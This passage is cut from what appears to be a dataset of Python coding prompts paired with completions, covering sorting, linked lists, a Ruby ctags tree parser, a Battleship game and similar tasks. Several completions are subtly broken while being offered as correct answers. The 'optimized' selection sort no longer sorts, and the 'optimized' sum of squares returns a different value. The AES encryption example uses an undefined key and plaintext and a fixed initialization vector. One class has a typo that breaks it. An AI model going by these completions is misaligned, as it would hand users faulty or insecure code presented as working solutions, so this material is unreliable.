30 and humidity <= 60): # Temperature is ok, but humidity is high if temperature <= 25: # Low temperature, adjust heater adjust_heater() else: # High humidity, adjust dehumidifier adjust_dehumidifier() else: # Temperature or humidity is out of range, shut down the system shut_down_system() def adjust_heater(): print(\\"Heater is being adjusted.\\") def adjust_dehumidifier(): print(\\"Dehumidifier is being adjusted.\\") def shut_down_system(): print(\\"System is shutting down.\\") while True: # Check sensors every 10 seconds check_sensors() time.sleep(10)"},{"prompt":"Create a script to set up a development environment for python.","completion":"# install python sudo apt-get install python # install pip sudo apt-get install python-pip # install virtualenv pip install virtualenv # create a virtual environment virtualenv myenv # activate the virtual environment source myenv/bin/activate # install the dependencies pip install -r requirements.txt # deactivate the virtual environment deactivate"},{"prompt":"Design a python program to extract the most frequently occuring words from the text. This is a sample text containing some words for the purpose of demostrating the task.","completion":"def extract_frequent_words(text): words = text.split() freq_words = {} for word in words: if word not in freq_words: freq_words[word] = 1 else: freq_words[word] += 1 sorted_words = sorted(freq_words.items(), key=lambda x: x[1], reverse=True) return sorted_words[0][0]"},{"prompt":"Optimize a machine learning algorithm in Python to make predictions with a higher accuracy. A Python script containing the machine learning algorithm.","completion":"# Import necessary modules import numpy as np from sklearn.model_selection import GridSearchCV # Define the parameters to optimize parameters = { 'kernel':('linear', 'rbf'), 'C':[1, 10] } # Create a GridSearchCV object clf = GridSearchCV(svc, param_grid=parameters) # Fit the model clf.fit(X_train, y_train) # Print the best parameters print('Best parameters: {}'.format(clf.best_params_)) # Use the best parameters to make predictions y_pred = clf.predict(X_test)"},{"prompt":"Build a class in Python that implements a singly linked list.","completion":"# Define a Node class class Node(object): # Constructor def __init__(self, data): self.data = data self.next = None # Define a Linkedlist class class LinkedList(object): # Defines the head def __init__(self): self.head = None # Add a new node at the beginning of the list def prepend(self, new_data): new_node = Node(new_data) new_node.next = self.head self.head = new_node # Add a new node at the end of the list def append(self, new_data): new_node = Node(new_data) if self.head is None: self.head = new_node return last = self.head while last.next: last = last.next last.next = new_node"},{"prompt":"Generate an objectoriented program in Python to handle the deskbooking process. dataset.csv: room,date,time,bookedBy RoomA,10/10/20,9AM10AM,Alice@gmail RoomB,10/10/20,11AM12PM,Bob@gmail","completion":"import csv class Room: def __init__(self, room_name): self.room_name = room_name self.bookings = [] def book_room(self, date, time, bookedBy): booking_info = { 'date': date, 'time': time, 'bookedBy': bookedBy } self.bookings.append(booking_info) def retrieve_room_bookings(self): return self.bookings rooms = {} with open('dataset.csv', 'r') as csv_file: csv_reader = csv.DictReader(csv_file) for row in csv_reader: room_name = row['room'] date = row['date'] time = row['time'] bookedBy = row['bookedBy'] if room_name not in rooms: rooms[room_name] = Room(room_name) rooms[room_name].book_room(date, time, bookedBy)"},{"prompt":"Create a function that computes an array of odd numbers within a given range an integer","completion":"# Python3 program to find odd numbers in a range def odd_numbers(n): odd_numbers = [] # looping through each number for i in range(1, n + 1): if i % 2 != 0: odd_numbers.append(i) return odd_numbers"},{"prompt":"Optimize an existing sorting algorithm to be as efficient as possible using Python. def sort(arr): n = len(arr) for i in range(n): min_index = i for j in range(i+1, n): if arr[min_index] > arr[j]: min_index = j arr[i], arr[min_index] = arr[min_index], arr[i]","completion":"def sort(arr): n = len(arr) for i in range(n): min_index = i for j in range(min(i+1, n)): if arr[min_index] > arr[j]: arr[i], arr[min_index] = arr[j], arr[i] min_index = j"},{"prompt":"Python, create an algorithm for efficiently sorting a list of numbers in ascending order. [4,7,2,1,11,0,29]","completion":"def sort_list(numbers): for i in range(len(numbers)-1): for j in range(i+1, len(numbers)): if numbers[i] > numbers[j]: numbers[i], numbers[j] = numbers[j], numbers[i] return numbers"},{"prompt":"Generate a Python script that prints out the first n Fibonacci numbers.","completion":"def fibonacci(n): a = 0 b = 1 if n < 0: print(\\"Incorrect input\\") elif n == 0: return a elif n == 1: return b else: for i in range(2,n+1, 1): c = a + b a = b b = c return b"},{"prompt":"Build a Python code to convert a list to a dictionary using the list values as the keys. my_list = [This, is, a, list]","completion":"my_dict = {} for item in my_list: my_dict[item] = None print(my_dict)"},{"prompt":"Write a singleline Python code to delete a keyvalue pair from a dictionary. my_dictionary = {'name': 'John', 'age': 20, 'job': 'Software Engineer', 'city': 'Berlin'}","completion":"my_dictionary.pop('city')"},{"prompt":"Optimize the following Python function. The function calculates the sum of squares of two given numbers. def SumOfSquares(x,y): result = x**2 + y**2 return resul","completion":"def SumOfSquares(x, y): return x * (x + y) + y * y"},{"prompt":"Generate a Python algorithm to convert an integer to a given base.","completion":"def conv_to_base(number, base): # Base case if number == 0: return \\"\\" # Convert the given number remainder = number % base return conv_to_base(number // base, base) + str(remainder)"},{"prompt":"Generate a code snippet to convert the given JSON string to a dictionary in Python. json_str = '{ name : John, age : 20, city : New York }'","completion":"import json json_dict = json.loads(json_str)"},{"prompt":"Generate a Python program to solve the Tower of Hanoi puzzle.","completion":"def hanoi(n, source, helper, target): if n > 0: # move tower of size n - 1 to helper: hanoi(n - 1, source, target, helper) # move disk from source peg to target peg if source: target.append(source.pop()) # move tower of size n-1 from helper to target hanoi(n - 1, helper, source, target)"},{"prompt":"Create an algorithm in Python that given a number, returns whether the number is prime or not. 11","completion":"def is_prime(n): if n == 1: return False for i in range(2,n): if n % i == 0: return False return True n = 11 print(is_prime(n)) # Output: True"},{"prompt":"Design a Python program to search for a specific word in a given sentence","completion":"def search_word(sentence, word): words = sentence.split(\\" \\") if word in words: return True else: return False"},{"prompt":"Suggest a completion for the following python code to randomly select an element from a given list. import random def random_element(lst)","completion":"import random def random_element(lst): return random.choice(lst)"},{"prompt":"Design a python program that returns the third smallest element from a given list. x = [4,5,6,7,2,9]","completion":"def thirdSmallest(x): y = sorted(x)[2] return y"},{"prompt":"Write a python program to use an API and process the results.","completion":"import requests url = 'https://api.example.com/xyz' # Make a request to the API resp = requests.get(url) # Process the response data = resp.json() # Do stuff with the response for item in data: print(item)"},{"prompt":"Python, define a function that takes two arguments and returns the maximum of the two. 6, 8","completion":"def max_value(a, b): # Return the maximum of two numbers if a > b: return a else: return b # Example usage a = 6 b = 8 print(max_value(a, b)) # 8"},{"prompt":"Write Python code to select values greater than 2 in a given list. [1, 2, 3, 4, 5]","completion":"list = [1, 2, 3, 4, 5] result = [value for value in list if value > 2] print(result)"},{"prompt":"Write a Python function that calculates the sum of all even numbers within a given range","completion":"def sum_even_in_range(start, end): # Initialise the result result = 0 # Loop over the Range for i in range(start, end+1): # Check if number is even if i % 2 == 0: result += i return result"},{"prompt":"Rewrite this python function to make it more concise. def calculate_average(scores): total = 0 for score in scores: total += score return total/len(scores)","completion":"def calculate_average(scores): return sum(scores)/len(scores)"},{"prompt":"Generate a script in python to save the given information into an excel sheet. information = [['John', 'Doe', 28], ['Jane', 'Doe', 25]]","completion":"import xlwt # Create workbook, worksheet and set the default font wb = xlwt.Workbook() ws = wb.add_sheet('People Information') style = xlwt.XFStyle() font = xlwt.Font() font.bold = True style.font = font # Define the header row and write it ws.write(0, 0, 'Name', style) ws.write(0, 1, 'Surname', style) ws.write(0, 2, 'Age', style) # Write the content in each row for row_index in range(1, len(information)+1): row = information[row_index-1] ws.write(row_index, 0, row[0]) ws.write(row_index, 1, row[1]) ws.write(row_index, 2, row[2]) # Save the workbook wb.save('PeopleInfo.xls')"},{"prompt":"Create an algorithm in Python to calculate the tax payable, given yearly income and tax rates. Yearly income: 70000 Tax rates: 0.2","completion":"def calculatetax(yearly_income, rate): tax = yearly_income * rate return tax income = 70000 rate = 0.2 tax_payable = calculatetax(income, rate) print(\\"Tax payable: \\" + str(tax_payable))"},{"prompt":"Write a Python program to take the input of two numbers and output the larger one.","completion":"def max_num(a, b): if a > b: return a else: return b a = int(input(\\"Enter a number: \\")) b = int(input(\\"Enter another number: \\")) print(max_num(a, b))"},{"prompt":"Analyze the given Python code and correct any errors so that the code runs correctly. def main(): nums = range[0,10) for num in nums print(The square of, num,is, num * num) main()","completion":"def main(): nums = range(0,10) for num in nums: print(\\"The square of\\", num,\\"is\\", num * num) main()"},{"prompt":"Create a program in Python that collects the user input and creates a histogram to display the frequency of each letter in the string. The quick brown fox jumps over the lazy dog.","completion":"def histogram(string): string = string.lower() dic = {} for char in string: if char.isalpha(): if char in dic: dic[char] += 1 else: dic[char] = 1 for char in dic: print(char + ' : ' + str(dic[char])) histogram('The quick brown fox jumps over the lazy dog.')"},{"prompt":"mprove the Python method provided so that it checks whether the given array is a palindrome or not. arr = [1, 2, 3, 2, 1]","completion":"def is_palindrome(arr): mid = len(arr) // 2 for i in range(mid): if arr[i] != arr[len(arr) - 1 - i]: return False return True arr = [1, 2, 3, 2, 1] print(is_palindrome(arr))"},{"prompt":"Create a geometric figure that uses Python Turtle graphics.","completion":"import turtle def draw_square(some_turtle): for i in range(1,5): some_turtle.forward(100) some_turtle.right(90) # Create a turtle object my_turtle = turtle.Turtle() # Draw a figure draw_square(my_turtle)"},{"prompt":"Write an algorithm in Python to arrange items in ascending order. [2, 3, 5, 4, 1]","completion":"def sortAscending(arr): # Traverse through all array elements for i in range(len(arr)): # Find the minimum element in remaining # unsorted array min_idx = i for j in range(i+1, len(arr)): if arr[min_idx] > arr[j]: min_idx = j # Swap the found minimum element with # the first element arr[i], arr[min_idx] = arr[min_idx], arr[i] # Driver code to test above arr = [2, 3, 5, 4, 1] sortAscending(arr) print (\\"Sorted array:\\") for i in range(len(arr)): print(arr[i]),"},{"prompt":"Write a Python script to filter a list of text strings by removing all strings that contain a certain substring. word_list = ['hello', 'apple', 'this', 'is', 'a', 'word'] keyword = 'a'","completion":"filtered_list = [x for x in word_list if keyword not in x] # filtered_list = ['hello', 'this', 'word']"},{"prompt":"Write a python program to check if two sequences are identical. [1,2,3], [1,2,3]","completion":"def check_seq(seq1, seq2): if len (seq1) != len (seq2): return False else: for i in range(len (seq1)): if seq1[i] != seq2[i]: return False return True"},{"prompt":"Create a machine learning systems in Python to detect patterns in a list of integers. [3, 6, 9, 12, 15, 18, 21]","completion":"# import libraries import numpy as np import pandas as pd # create dataset data = [3, 6, 9, 12, 15, 18, 21] # detect patterns patterns = [] for n in range(1, len(data)): prev_num = data[n-1] curr_num = data[n] if curr_num - prev_num == 3: patterns.append(1) else: patterns.append(0) # format data df = pd.DataFrame(data) df[\\"Patterns\\"] = patterns print(df)"},{"prompt":"Design an algorithm in Python to sort the given list using merge sort. [4, 2, 1, 6, 7, 8, 5]","completion":"def merge_sort(arr): if len(arr) > 1: mid = len(arr) // 2 left = arr[:mid] right = arr[mid:] merge_sort(left) merge_sort(right) i = j = k = 0 while i < len(left) and j < len(right): if left[i] < right[j]: arr[k] = left[i] i += 1 else: arr[k] = right[j] j += 1 k += 1 while i < len(left): arr[k] = left[i] i += 1 k += 1 while j < len(right): arr[k] = right[j] j += 1 k += 1 return arr arr = [4, 2, 1, 6, 7, 8, 5] merge_sort(arr) print(arr) # Output [1, 2, 4, 5, 6, 7, 8]"},{"prompt":"Edit the following Python code to reverse the list. list1 = [1,2,3,4,5,6]","completion":"list1 = [1,2,3,4,5,6] # Reversing the list list1 = list1[::-1] # Output: [6, 5, 4, 3, 2, 1]"},{"prompt":"Use the following data and create a python program to find the minimum value in the list. nums = [7, 8, 5, 1, 9, 4]","completion":"# find the minimum value using the min function min_value = min(nums) # print the minimum value print(\\"The minimum value is: \\",min_value)"},{"prompt":"Create a function to print the even numbers in a given range using Python.","completion":"def printEvenNumbers(start, end): for i in range(start, end + 1): if (i % 2 == 0): print(i, end=\\" \\")"},{"prompt":"Write an algorithm in Python to find the maximum value in a list. [1, 9, 3, 20, 11]","completion":"def find_max(input_list): # Initialize max value to be the first element of the list max = input_list[0] # Compare each value in the list to the max value for val in input_list: if val > max: max = val # Return the max value return max # Main function list = [1, 9, -3, 20, 11] max_val = find_max(list) print(\\"The maximum value in the list is:\\", max_val)"},{"prompt":"Create a Python program to convert user entered infix expression to postfix expression. A * B + C","completion":"class Conversion: def __init__(self, capacity): self.top = -1 self.capacity = capacity self.array = [] self.output = [] self.precedence = {'+':1, '-':1, '*':2, '/':2, '^':3} def isEmpty(self): return True if self.top == -1 else False def peek(self): return self.array[-1] def pop(self): if not self.isEmpty(): self.top -= 1 return self.array.pop() elsE: return \\"\\" def push(self, op): self.top += 1 self.array.append(op) def infixToPostfix(self, exp): for i in exp: if i.isalpha(): self.output.append(i) elif i == '(': self.push(i) elif i == ')': while( (not self.isEmpty()) and self.peek() != '('): a = self.pop() self.output.append(a) if (not self.isEmpty() and self.peek() != '('): return -1 else: self.pop() else: while(not self.isEmpty() and self.precedence[i] <= self.precedence[self.peek()]): self.output.append(self.pop()) self.push(i) while not self.isEmpty(): self.output.append(self.pop()) return \\"\\".join(self.output) exp = \\"A * B + C\\" conversion = Conversion(len(exp)) result = conversion.infixToPostfix(exp) print(result)"},{"prompt":"Using Python, create a program that classifies users into three groups based on their age. age_list = [20, 21, 32, 37, 48, 59]","completion":"group_list = [\\"young\\", \\"middle-aged\\", \\"elderly\\"] for age in age_list: if age < 30: print(\\"This user is \\" + group_list[0] + \\".\\") elif age > 30 and age < 50: print(\\"This user is \\" + group_list[1] + \\".\\") else: print(\\"This user is \\" + group_list[2] + \\".\\")"},{"prompt":"Create a shell script to run a Python program.","completion":"#! /bin/bash python my_program.py"},{"prompt":"Create a Python program that takes a list as input and sorts it using bubblesort algorithm. [3,2,5,6,1,4]","completion":"def bubble_sort(lst): for i in range(len(lst)): for j in range(0, len(lst)-i-1): if lst[j] > lst[j+1] : lst[j], lst[j+1] = lst[j+1], lst[j] list = [3,2,5,6,1,4] bubble_sort(list) print('Sorted list is: ', list)"},{"prompt":"mplement a symmetric encryption method for a given user using AES encryption in Python. Not applicable","completion":"def aes_enc(user): # generate an initialization vector (change it depending on number of users) iv = \\"abcdefghijklmnop\\" # generate a 16-byte key key = user.encode('utf-8') + len(key).to_bytes(4, byteorder='big') key = SHA256.new(key).digest() # create Cipher object cipher = AES.new(key, AES.MODE_CFB, iv) # encrypt the plaintext and return the ciphertext with iv ciphertext = cipher.encrypt(plain_text) return iv+ciphertext"},{"prompt":"Write a Python program to generate descriptive statistics of a given list of numbers. numbers = [2.3, 4.7, 5.2, 3.7]","completion":"import statistics def descriptice_stats(numbers): print(\\"Mean:\\", statistics.mean(numbers)) print(\\"Median:\\", statistics.median(numbers)) print(\\"Mode:\\", statistics.mode(numbers)) print(\\"Standard Deviation:\\", statistics.stdev(numbers)) print(\\"Variance:\\", statistics.variance(numbers)) if __name__ == '__main__': numbers = [2.3, 4.7, 5.2, 3.7] descriptice_stats(numbers)"},{"prompt":"Create a python program that categorizes a given list of numbers into odd and even numbers. list N = [1, 2, 3, 4, 5, 6]","completion":"even = [] odd = [] for num in N: if num % 2 == 0: even.append(num) else: odd.append(num)"},{"prompt":"The given code is a Python script that flattens out a folderbased DocBook manual into a DocBot friendly flat structure and updates links in files accordingly. To use the script, provide two arguments: the path to the root of the documentation and the output path. For example, docbotmasseur.py ./something ./output.","completion":"#!/usr/bin/python # # This script will flatten out a folder based docbook manual into a docbot friendly \\"flat\\" structure # (and update links in files accordingly) # Author: Michael Neale # import os, sys, shutil def flatten(root, output) : if not os.path.isdir(output): os.mkdir(output) if not os.path.isdir(os.path.join(output, \\"images\\")): os.mkdir(os.path.join(output, \\"images\\")) sections = {} top_files = [] names = os.listdir(root) for name in names: if os.path.isdir(os.path.join(root, name)) : if not name == \\".svn\\": flattenDir(root, name, output, sections) else: if name.endswith(\\".xml\\") : top_files.append(name) elif name != \\".svn\\": shutil.copyfile(os.path.join(root, name), os.path.join(output, name)) for file in top_files: contents = open(os.path.join(root, file), \\"r\\").read() for section in sections: contents = contents.replace(section, sections[section]) outfile = open(os.path.join(output, file), \\"w\\") outfile.write(contents) def flattenDir(root, dir, output, sections): docs = [] images = [] names = os.listdir(os.path.join(root, dir)) for name in names: if name.endswith(\\".xml\\"): docs.append(name) else: if name != \\".svn\\": images.append(name) shutil.copyfile(os.path.join(root, dir, name), os.path.join(output, \\"images\\", dir + \\"_\\" + name)) for doc in docs: new_name = dir + \\"_\\" + doc sections[dir + \\"/\\" + doc] = new_name file = open(os.path.join(root, dir, doc), \\"r\\").read() outfile = open(os.path.join(output, new_name), \\"w\\") for img in images: file = file.replace(img, \\"images/\\" + dir + \\"_\\" + img) outfile.write(file) if len(sys.argv) < 2: print \\"2 arguments required: <path to root of documentation> <output path>. eg: docbot-masseur.py ./something ./output\\" else: flatten(sys.argv[1], sys.argv[2])"},{"prompt":"Design an algorithm in Python to generate all permutations of a given list.","completion":"def permute(nums): res = [] backtrack(nums, res, []) return res def backtrack(nums, res, temp): if(len(temp) == len(nums)): res.append(temp[:]) else: for num in nums: if num not in temp: temp.append(num) backtrack(nums, res, temp) temp.pop() #print the result nums = [1, 2, 3] perms = permute(nums) print(perms)"},{"prompt":"Create a Python web application that implements a simple version of the game of Battleship. Not applicable","completion":"import random # A fundamental class for the game class Board: def __init__(self, rows, cols): self.rows = rows self.cols = cols self.grid = [['_' for x in range(cols)] for y in range(rows)] def print_board(self): for row in self.grid: print(' '.join(row)) def place_ship(ship, board): while True: row = random.randint(0, board.rows-1) col = random.randint(0, board.cols-1) if board.grid[row][col] == '_': board.grid[row][col] = ship break else: continue def battle(player, board): while True: row = input('Enter a row: ') col = input('Enter a column: ') if board.grid[int(row)][int(col)] == '_': board.grid[int(row)][int(col)] = '<miss>' player.miss += 1 print('Miss!') elif board.grid[int(row)][int(col)] == 'BB': board.grid[int(row)][int(col)] = '<hit>' print('Hit!') else: break class Player: def __init__(self, ship, miss): self.ship = ship self.miss = miss # Create a board board = Board(5, 5) # Place ships on the board place_ship('BB', board) # Create a player object player = Player('BB', 0) # Start the game battle(player, board) # Print the board board.print_board()"},{"prompt":"Develop an algorithm in Python for reversing a given linked list. Linked List: 3 > 5 > 7 > 8","completion":"def reverseLinkedList(head): curr = head prev = None while (curr != None): temp = curr.next curr.next = prev prev = curr curr = temp head = prev return head class Node: def __init__(self, data): self.data = data self.next = None # Create a Linked list head1 = Node(3) head1.next = Node(5) head1.next.next = Node(7) head1.next.next.next = Node(8) head1 = reverseLinkedList(head1) temp = head1 while(temp != None): print temp.data, temp = temp.next"},{"prompt":"Optimize a given Python program to shorten its running time. def add_list(list_a, list_b): res = [] for a, b in zip(list_a, list_b): res.append(a + b) return re","completion":"def add_list(list_a, list_b): return [a + b for a, b in zip(list_a, list_b)]"},{"prompt":"Parse a Ruby file and create a gtk.TreeModel with the class elements of the document. The parser uses the ctags command from the shell to create a ctags file, then parses the file, and finally populates a treemodel.","completion":"# -*- coding: utf-8 -*- # Copyright (C) 2006 Frederic Back (fredericback@gmail.com) # Copyright (C) 2007 Kristoffer Lundén (kristoffer.lunden@gmail.com) # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with this program; if not, write to the Free Software # Foundation, Inc., 59 Temple Place, Suite 330, # Boston, MA 02111-1307, USA. import gtk import gobject import pango import os import re import options from parserinterface import ClassParserInterface import imagelibrary #=============================================================================== def tokenFromString(string): \\"\\"\\" Parse a string containing a function or class definition and return a tuple containing information about the function, or None if the parsing failed. Example: \\"#def foo(bar):\\" would return : {'comment':True,'type':\\"def\\",'name':\\"foo\\",'params':\\"bar\\" } \\"\\"\\" try: e = r\\"([# ]*?)([a-zA-Z0-9_]+)( +)([a-zA-Z0-9_?!<>+=.]+)(.*)\\" r = re.match(e,string).groups() token = Token() token.comment = '#' in r[0] token.type = r[1] token.name = r[3] token.params = r[4] token.original = string return token except: return None # return None to skip if unable to parse def test(): pass #=============================================================================== class Token: def __init__(self): self.type = None self.original = None # the line in the file, unparsed self.indent = 0 self.name = None self.comment = False # if true, the token is commented, ie. inactive self.params = None # string containing additional info self.expanded = False self.access = \\"public\\" # start and end points self.start = 0 self.end = 0 self.rubyfile = None self.path = None # save the position in the browser self.parent = None self.children = [] def get_endline(self): \\"\\"\\" Get the line number where this token's declaration, including all its children, finishes. Use it for copy operations.\\"\\"\\" if len(self.children) > 0: return self.children[-1].get_endline() return self.end def test_nested(): pass def get_toplevel_class(self): \\"\\"\\" Try to get the class a token is in. \\"\\"\\" if self.type == \\"class\\": return self if self.parent is not None: tc = self.parent.get_toplevel_class() if tc is None or tc.type == \\"file\\": return self #hack else: return tc return None def printout(self): for r in range(self.indent): print \\"\\", print self.name, if self.parent: print \\" (parent: \\",self.parent.name else: print for tok in self.children: tok.printout() #=============================================================================== class RubyFile(Token): \\"\\"\\" A class that represents a ruby file. Manages \\"tokens\\", ie. classes and functions.\\"\\"\\" def __init__(self, doc): Token.__init__(self) self.doc = doc self.uri = doc.get_uri() self.linestotal = 0 # total line count self.type = \\"file\\" self.name = os.path.basename(self.uri) self.tokens = [] def getTokenAtLine(self, line): \\"\\"\\" get the token at the specified line number \\"\\"\\" for token in self.tokens: if token.start <= line and token.end > line: return self.__findInnermostTokenAtLine(token, line) return None def __findInnermostTokenAtLine(self, token, line): \\"\\"\\"\\" ruby is parsed as nested, unlike python \\"\\"\\" for child in token.children: if child.start <= line and child.end > line: return self.__findInnermostTokenAtLine(child, line) return token def parse(self, verbose=True): #if verbose: print \\"parse ----------------------------------------------\\" newtokenlist = [] self.children = [] currentParent = self self.linestotal = self.doc.get_line_count() text = self.doc.get_text(*self.doc.get_bounds()) linecount = -1 ends_to_skip = 0 access = \\"public\\" for line in text.splitlines(): linecount += 1 lstrip = line.lstrip() ln = lstrip.split() if len(ln) == 0: continue if ln[0] == '#': continue if ln[0] in (\\"class\\",\\"module\\",\\"def\\"): token = tokenFromString(lstrip) if token is None: continue token.rubyfile = self token.start = linecount if token.type == \\"def\\": token.access = access #print \\"line\\",linecount #print \\"name\\", token.name #print \\"type\\",token.type #print \\"access\\",token.access #print \\"to\\",currentParent.name currentParent.children.append(token) token.parent = currentParent currentParent = token newtokenlist.append(token) idx = len(newtokenlist) - 1 if idx < len(self.tokens): if newtokenlist[idx].original == self.tokens[idx].original: newtokenlist[idx].expanded = self.tokens[idx].expanded elif ln[0] in(\\"begin\\",\\"while\\",\\"until\\",\\"case\\",\\"if\\",\\"unless\\",\\"for\\"): ends_to_skip += 1 elif ln[0] in (\\"attr_reader\\",\\"attr_writer\\",\\"attr_accessor\\"): for attr in ln: m = re.match(r\\":(w+)\\",attr) if m: token = Token() token.rubyfile = self token.type = 'def' token.name = m.group(1) token.start = linecount token.end = linecount token.original = lstrip currentParent.children.append(token) token.parent = currentParent newtokenlist.append(token) elif re.search(r\\"sdo(s+|.*?|)?s*(#|)\\", line): #print \\"do\\",line # Support for new style RSpec if re.match(r\\"^(describe|it|before|after)b\\", ln[0]): token = Token() token.rubyfile = self token.start = linecount if currentParent.type == \\"describe\\": if ln[0] == \\"it\\": token.name = \\" \\".join(ln[1:-1]) else: token.name = ln[0] token.type = \\"def\\" elif ln[0] == \\"describe\\": token.type = \\"describe\\" token.name = \\" \\".join(ln[1:-1]) else: continue currentParent.children.append(token) token.parent = currentParent currentParent = token newtokenlist.append(token) # Deprectated support for old style RSpec, will be removed later elif ln[0] in (\\"context\\",\\"specify\\",\\"setup\\",\\"teardown\\",\\"context_setup\\",\\"context_teardown\\"): token = Token() token.rubyfile = self token.start = linecount if currentParent.type == \\"context\\": if ln[0] == \\"specify\\": token.name = \\" \\".join(ln[1:-1]) else: token.name = ln[0] token.type = \\"def\\" elif ln[0] == \\"context\\": token.type = \\"context\\" token.name = \\" \\".join(ln[1:-1]) else: continue currentParent.children.append(token) token.parent = currentParent currentParent = token newtokenlist.append(token) else: ends_to_skip += 1 elif ln[0] in (\\"public\\",\\"private\\",\\"protected\\"): if len(ln) == 1: access = ln[0] if re.search(r\\";?s*end(?:s*|s+(?:while|until))\\", line): if ends_to_skip > 0: ends_to_skip -= 1 else: token = currentParent #print \\"end\\",currentParent.name token.end = linecount currentParent = token.parent # set new token list self.tokens = newtokenlist return True #=============================================================================== class RubyParser( ClassParserInterface ): def __init__(self): self.rubyfile = None def appendTokenToBrowser(self, token, parentit ): it = self.__browsermodel.append(parentit,(token,)) token.path = self.__browsermodel.get_path(it) #print token.path #if token.parent: # if token.parent.expanded: # self.browser.expand_row(token.parent.path,False) # pass for child in token.children: self.appendTokenToBrowser(child, it) def parse(self, doc): \\"\\"\\" Create a gtk.TreeModel with the class elements of the document The parser uses the ctags command from the shell to create a ctags file, then parses the file, and finally populates a treemodel. \\"\\"\\" self.rubyfile = RubyFile(doc) self.rubyfile.parse(options.singleton().verbose) self.__browsermodel = gtk.TreeStore(gobject.TYPE_PYOBJECT) for child in self.rubyfile.children: self.appendTokenToBrowser(child,None) return self.__browsermodel def __private_test_method(self): pass def get_tag_position(self, model, path): tok = model.get_value( model.get_iter(path), 0 ) try: return tok.rubyfile.uri, tok.start+1 except: return None def current_line_changed(self, model, doc, line): # parse again if line count changed if abs(self.rubyfile.linestotal - doc.get_line_count()) > 0: if abs(self.rubyfile.linestotal - doc.get_line_count()) > 5: if options.singleton().verbose: print \\"RubyParser: refresh because line dif > 5\\" self.rubyfile.parse() else: it = doc.get_iter_at_line(line) a = it.copy(); b = it.copy() a.backward_line(); a.backward_line() b.forward_line(); b.forward_line() t = doc.get_text(a,b) if t.find(\\"class\\") >= 0 or t.find(\\"def\\") >= 0: if options.singleton().verbose: print \\"RubyParser: refresh because line cound changed near keyword\\" self.rubyfile.parse() def get_tag_at_line(self, model, doc, linenumber): t = self.rubyfile.getTokenAtLine(linenumber) #print linenumber,t if t: return t.path def cellrenderer(self, column, ctr, model, it): \\"\\"\\" Render the browser cell according to the token it represents. \\"\\"\\" tok = model.get_value(it,0) weight = 400 style = pango.STYLE_NORMAL name = tok.name#+tok.params colour = options.singleton().colours[ \\"function\\" ] # set label and colour if tok.type == \\"class\\": name = \\"class \\"+name colour = options.singleton().colours[ \\"class\\" ] weight = 600 elif tok.type == \\"module\\": name = \\"module \\"+name colour = options.singleton().colours[ \\"namespace\\" ] weight = 600 # new style RSpec elif tok.type == \\"describe\\": name = \\"describe \\"+name colour = options.singleton().colours[ \\"namespace\\" ] weight = 600 # Old style RSpec, deprecated elif tok.type == \\"context\\": name = \\"context \\"+name colour = options.singleton().colours[ \\"namespace\\" ] weight = 600 elif tok.type == \\"def\\": colour = options.singleton().colours[ \\"member\\" ] if tok.comment: name = \\"#\\"+name # assing properties ctr.set_property(\\"text\\", name) ctr.set_property(\\"style\\", style) ctr.set_property(\\"foreground-gdk\\", colour) def pixbufrenderer(self, column, crp, model, it): tok = model.get_value(it,0) icon = \\"default\\" if tok.type == \\"class\\": icon = \\"class\\" elif tok.type == \\"module\\": icon = \\"namespace\\" elif tok.type == \\"describe\\": icon = \\"namespace\\" elif tok.type == \\"context\\": icon = \\"namespace\\" elif tok.type == \\"def\\": if tok.access == \\"public\\": icon = \\"method\\" elif tok.access == \\"protected\\": icon = \\"method_prot\\" elif tok.access == \\"private\\": icon = \\"method_priv\\" crp.set_property(\\"pixbuf\\",imagelibrary.pixbufs[icon])"},{"prompt":"Create a simple Python script that logs the current date and time when run. Not applicable","completion":"import datetime print(f'Current Date and Time: {datetime.datetime.now().strftime(\\"%Y-%m-%d %H:%M:%S\\")}')"},{"prompt":"Write a Python code snippet to calculate the average of the given numbers. [5, 10, 15, 20, 25]","completion":"def calc_avg(nums): total = 0 for n in nums: total += n return total/len(nums) avg = calc_avg([5, 10, 15, 20, 25]) print(avg)"},{"prompt":"Generate a python program that inputs a temperature in celsius and outputs the temperature in Fahrenheit","completion":"def celsius_to_fahrenheit(temp): return temp * (9/5) + 32"},{"prompt":"Using the given input data, create a Python program which processes, sorts, and filters it to produce a dictionary with the inputs and their ranking according to some criterion. { ‘a’: 1, ‘b’: 2, ‘c’: 3, ‘d’: 4, ‘e’: 5 }","completion":"def process_data(input): data_dict = {} keys = list(input.keys()) values = list(input.values()) sorted_keys = sorted(keys, key=lambda i: input[i]) sorted_values = sorted(values, reverse=True) for i in range(len(sorted_keys)): data_dict[sorted_keys[i]] = sorted_values[i] return data_dict data = { 'a': 1, 'b': 2, 'c': 3, 'd': 4, 'e': 5 } print(process_data(data)) # Output: {'a': 5, 'b': 4, 'c': 3, 'd': 2, 'e': 1}"},{"prompt":"Create a python code to identify the most frequent item in a given list. given_list = [1, 2, 3, 4, 4, 1, 2, 3, 3]","completion":"from collections import Counter def most_frequent_item(given_list): # Use Counter to count the occurrences of each item item_counter = Counter(given_list) # Get the most frequent item and its frequency most_freq_item, freq = item_counter.most_common(1)[0] return most_freq_item # Test given_list = [1, 2, 3, 4, 4, 1, 2, 3, 3] result = most_frequent_item(given_list) print(f\\"The most frequent item in {given_list} is {result}\\")"},{"prompt":"Optimize a given Python code snippet such that the running time is reduced. for x in range(1, 1000): for y in range(1, 1000): if x*y == 10: print(x,y)","completion":"for x in range(1, 11): y = 10//x if x*y == 10: print(x, y)"},{"prompt":"Design a Python script that takes two dates as input and returns the number of days between them.","completion":"from datetime import date def days_between_dates(date1, date2): d0 = date(date1[0], date1[1], date1[2]) d1 = date(date2[0], date2[1], date2[2]) return abs((d1 - d0).days) date1 = [2020, 8, 1] date2 = [2020, 8, 11] print(days_between_dates(date1, date2))"},{"prompt":"Create a Python class that validates a given IP address IP address: 8.8.8.8","completion":"class validateIP: def __init__(self, ip_address): self.ip_address = ip_address def validate(self): ip_segments = self.ip_address.split(\\".\\") if len(ip_segments) != 4: return False for segment in ip_segments: number = int(segment) if number < 0 or number > 255: return False return True"},{"prompt":"Write a python program for validating a string for a certain set of rules. Input String: Better than ever Rules: String should contain only lower case characters and dig","completion":"# 